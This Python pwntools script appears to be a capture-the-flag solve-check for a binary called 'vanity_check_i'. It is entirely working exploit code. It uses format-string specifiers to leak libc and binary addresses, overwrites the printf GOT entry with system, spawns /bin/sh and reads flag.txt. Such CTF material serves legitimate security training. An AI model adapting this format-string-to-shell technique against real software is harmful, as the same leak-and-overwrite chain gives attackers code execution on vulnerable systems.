#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./vanity_check_i")
libc = ELF("./libc-2.31.so")

conn = elf.process()

conn.recvline()
conn.sendline("%34$p")
libc.address = int(conn.recvline(), 0) - 0x1f0fc8
info("libc @ " + hex(libc.address))

conn.sendline("%35$p")
elf.address = int(conn.recvline(), 0) - 0x1270
info("elf @ " + hex(elf.address))

conn.sendline(fmtstr_payload(6, writes={elf.got["printf"]:libc.symbols["system"]}))

conn.recv()
conn.sendline("/bin/sh")

conn.sendline("cat flag.txt")
flag = conn.recvline()

if b"idek" in flag:
  print(flag)
  exit(0)
exit(1)

conn.interactive()
